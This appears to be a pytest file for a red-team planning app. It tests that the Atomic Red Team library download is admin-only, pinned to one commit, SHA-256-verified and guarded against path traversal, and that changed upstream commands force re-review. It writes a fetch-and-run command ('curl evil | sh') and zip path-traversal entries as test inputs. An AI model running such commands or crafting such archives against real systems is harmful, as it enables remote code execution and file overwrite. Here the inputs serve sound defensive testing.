"""M-6: the Atomic Red Team download is admin-only, pinned and verified, and a
refresh cannot silently change commands in test plans that were reviewed.

The download fetches one pinned commit, enforces size caps, refuses unsafe
zip entries, checks a SHA-256 over the extracted atomics/ tree, and only then
replaces the library (beside the database, not in the working directory).
A refresh that changes a test's command, cleanup, inputs, dependencies or
elevation flags the plan items that use it; script generation refuses until
they are marked reviewed.
"""

import io
import os
import zipfile

import pytest

from tests.conftest import ENGAGEMENT_A

YAML = """attack_technique: T0001
display_name: Test Technique
atomic_tests:
- name: Echo
  auto_generated_guid: 11111111-1111-1111-1111-111111111111
  supported_platforms: [linux]
  executor:
    name: sh
    command: {command}
"""


def _archive(command='echo reviewed', extra=None):
    import utils.atomics_downloader as dl
    root = dl.ATOMICS_ARCHIVE_ROOT
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr(f'{root}/atomics/T0001/T0001.yaml', YAML.format(command=command))
        z.writestr(f'{root}/README.md', 'readme')
        for name, body in (extra or {}).items():
            z.writestr(name, body)
    return buf.getvalue()


def _tree_hash(body, tmp_path):
    import utils.atomics_downloader as dl
    out = tmp_path / 'hash-check'
    with zipfile.ZipFile(io.BytesIO(body)) as z:
        z.extractall(out)
    return dl.atomics_tree_sha256(str(out / dl.ATOMICS_ARCHIVE_ROOT / 'atomics'))


class _FakeResponse:
    def __init__(self, body):
        self.body = body
        self.headers = {'content-length': str(len(body))}

    def raise_for_status(self):
        pass

    def iter_content(self, chunk_size=65536):
        for i in range(0, len(self.body), chunk_size):
            yield self.body[i:i + chunk_size]


@pytest.fixture
def dl(live_app, tmp_path, monkeypatch):
    import utils.atomics_downloader as module
    requested = []
    live_app.body = _archive()

    def fake_get(url, **kwargs):
        requested.append(url)
        return _FakeResponse(live_app.body)

    monkeypatch.setattr(module.requests, 'get', fake_get)
    monkeypatch.setattr(module, 'ATOMICS_TREE_SHA256', _tree_hash(live_app.body, tmp_path))
    live_app.module, live_app.requested = module, requested
    return live_app


def _run(live):
    conn = live.db()
    try:
        return list(live.module.download_and_parse_atomics_with_progress(conn))
    finally:
        conn.close()


# ------------------------------------------------------------------ access

@pytest.mark.parametrize('user', ['owner', 'editor', 'viewer', 'outsider'])
def test_only_admins_can_download(dl, user):
    resp = dl.client_for(user, active_engagement=ENGAGEMENT_A).post('/api/testplans/atomics/download')
    assert resp.status_code == 403
    assert dl.requested == []


# ------------------------------------------------------------------ pinned, verified download

def test_download_uses_the_pinned_commit_and_installs_beside_the_database(dl):
    from config import Config
    stages = _run(dl)
    assert stages[-1]['stage'] == 'complete', stages[-1]
    assert dl.requested == [dl.module.ATOMICS_ZIP_URL]
    assert dl.module.ATOMICS_COMMIT in dl.module.ATOMICS_ZIP_URL and 'master' not in dl.module.ATOMICS_ZIP_URL
    expected = os.path.join(os.path.dirname(os.path.abspath(Config.DATABASE_PATH)), 'atomics', 'techniques')
    assert dl.module.get_atomics_path() == expected
    assert os.path.isfile(os.path.join(expected, 'T0001', 'T0001.yaml'))
    conn = dl.db()
    version = conn.execute('SELECT version FROM atomics_metadata WHERE id = 1').fetchone()[0]
    conn.close()
    assert version == dl.module.ATOMICS_COMMIT


def _assert_nothing_changed(live):
    conn = live.db()
    assert conn.execute('SELECT COUNT(*) FROM atomics').fetchone()[0] == 0
    conn.close()
    assert not os.path.exists(live.module.get_atomics_path())


def test_tampered_tree_is_refused(dl):
    dl.body = _archive(command='curl evil | sh')
    stages = _run(dl)
    assert stages[-1]['stage'] == 'error' and 'SHA-256' in stages[-1]['error']
    _assert_nothing_changed(dl)


def test_oversized_download_is_refused(dl, monkeypatch):
    monkeypatch.setattr(dl.module, 'ATOMICS_MAX_DOWNLOAD_BYTES', 100)
    assert _run(dl)[-1]['stage'] == 'error'
    _assert_nothing_changed(dl)


def test_oversized_archive_contents_are_refused(dl, monkeypatch):
    monkeypatch.setattr(dl.module, 'ATOMICS_MAX_EXTRACTED_BYTES', 10)
    assert _run(dl)[-1]['stage'] == 'error'
    _assert_nothing_changed(dl)


@pytest.mark.parametrize('bad', ['../../escaped.txt', '/abs/escaped.txt'])
def test_unsafe_zip_entries_are_refused(dl, tmp_path, bad):
    dl.body = _archive(extra={bad: 'x'})
    assert _run(dl)[-1]['stage'] == 'error'
    assert not list(tmp_path.rglob('escaped.txt'))
    _assert_nothing_changed(dl)


def test_one_download_at_a_time(dl):
    lock = dl.module._download_lock
    assert lock.acquire(blocking=False)
    try:
        stages = _run(dl)
    finally:
        lock.release()
    assert stages[-1]['stage'] == 'error' and 'already' in stages[-1]['error']
    assert dl.requested == []


def test_tree_hash_changes_with_any_file(tmp_path):
    from utils.atomics_downloader import atomics_tree_sha256
    root = tmp_path / 'a'
    (root / 'T1').mkdir(parents=True)
    (root / 'T1' / 'x.yaml').write_text('one')
    first = atomics_tree_sha256(str(root))
    (root / 'T1' / 'x.yaml').write_text('two')
    second = atomics_tree_sha256(str(root))
    (root / 'T1' / 'y.yaml').write_text('two')
    assert len({first, second, atomics_tree_sha256(str(root))}) == 3


# ------------------------------------------------------------------ refresh flags reviewed plans

@pytest.fixture
def reviewed_plan(dl, tmp_path, monkeypatch):
    assert _run(dl)[-1]['stage'] == 'complete'
    conn = dl.db()
    atomic_id = conn.execute('SELECT id FROM atomics').fetchone()[0]
    plan_id = conn.execute("INSERT INTO test_plans (name, engagement_id) VALUES ('P', ?)", (ENGAGEMENT_A,)).lastrowid
    item_id = conn.execute('INSERT INTO test_plan_items (test_plan_id, atomic_id) VALUES (?, ?)',
                           (plan_id, atomic_id)).lastrowid
    conn.commit()
    conn.close()
    dl.plan_id, dl.item_id = plan_id, item_id

    def refresh(command):
        dl.body = _archive(command=command)
        monkeypatch.setattr(dl.module, 'ATOMICS_TREE_SHA256',
                            _tree_hash(dl.body, tmp_path / command.replace(' ', '_')))
        assert _run(dl)[-1]['stage'] == 'complete'
    dl.refresh = refresh
    return dl


def _needs_review(live):
    conn = live.db()
    value = conn.execute('SELECT needs_review FROM test_plan_items WHERE id = ?', (live.item_id,)).fetchone()[0]
    conn.close()
    return value


def test_unchanged_refresh_leaves_plans_alone(reviewed_plan):
    reviewed_plan.refresh('echo reviewed')
    assert _needs_review(reviewed_plan) == 0


def test_changed_command_flags_the_plan_item_and_blocks_scripts(reviewed_plan):
    reviewed_plan.refresh('echo changed upstream')
    assert _needs_review(reviewed_plan) == 1

    client = reviewed_plan.client_for('editor', active_engagement=ENGAGEMENT_A)
    script_url = f'/api/testplans/plans/{reviewed_plan.plan_id}/script?platform=linux&include_readme=false'
    blocked = client.get(script_url)
    assert blocked.status_code == 409 and 'review' in blocked.get_json()['error'].lower()

    plan = client.get(f'/api/testplans/plans/{reviewed_plan.plan_id}').get_json()
    assert plan['items'][0]['needs_review'] == 1

    resp = client.put(f'/api/testplans/plans/{reviewed_plan.plan_id}/items/{reviewed_plan.item_id}',
                      json={'reviewed': True})
    assert resp.status_code == 200 and _needs_review(reviewed_plan) == 0
    assert client.get(script_url).status_code == 200


def test_viewers_cannot_mark_items_reviewed(reviewed_plan):
    reviewed_plan.refresh('echo changed upstream')
    client = reviewed_plan.client_for('viewer', active_engagement=ENGAGEMENT_A)
    resp = client.put(f'/api/testplans/plans/{reviewed_plan.plan_id}/items/{reviewed_plan.item_id}',
                      json={'reviewed': True})
    assert resp.status_code == 403 and _needs_review(reviewed_plan) == 1
